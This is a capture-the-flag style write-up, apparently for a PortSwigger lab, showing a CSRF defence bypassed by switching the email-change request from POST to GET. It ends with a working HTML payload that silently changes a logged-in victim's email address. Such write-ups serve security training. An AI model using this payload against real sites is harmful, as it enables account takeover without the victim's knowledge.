# CSRF — Token Checks Depend on the HTTP Method Used

The email-change feature here does attempt to defend against CSRF, but that defense is only enforced for certain request methods — not all of them.

**Goal:** Host an HTML page on the exploit server that performs a CSRF attack to change the victim's email address.

Login credentials for your own account: wiener:peter

Hint: Registering an email already used by someone else isn't allowed. If you test with your own account, be sure to use a different address when building the exploit you'll actually send to the victim.

---

**Reference:** https://portswigger.net/web-security/csrf

---

Lab URL generated: https://0af7002903ddc72c818c574600ce0059.web-security-academy.net/

<img width="764" height="406" alt="1" src="https://github.com/user-attachments/assets/92eb845f-65a8-4c08-b323-a7210959768b" />


<img width="725" height="314" alt="2" src="https://github.com/user-attachments/assets/e740067e-b3ff-48ee-987e-1975a4ec1658" />


The normal request is a POST:

<img width="516" height="467" alt="3" src="https://github.com/user-attachments/assets/dcabd1ee-a442-49a6-9709-f5d452fb888d" />


Switching the method to GET still works:

/my-account/change-email?email=test3%40test.com

<img width="513" height="464" alt="4" src="https://github.com/user-attachments/assets/b62005c8-47a5-4d48-a4f8-f03fa5fa6aa4" />


A redirect response is returned — following it confirms the email was actually updated:

<img width="251" height="150" alt="5" src="https://github.com/user-attachments/assets/65eaf377-6ce8-4eb4-af28-c8b8357c804d" />


<img width="272" height="323" alt="6" src="https://github.com/user-attachments/assets/6f2689de-4400-438b-8b19-d855dc1a2372" />


Final payload used:

```
<body onload="window.open('https://0af7002903ddc72c818c574600ce0059.web-security-academy.net/my-account/change-email?email=test3%40test.com')">
```
<img width="1168" height="648" alt="7" src="https://github.com/user-attachments/assets/5c77ab97-dba1-4f36-8916-1e9cd2a58cd6" />


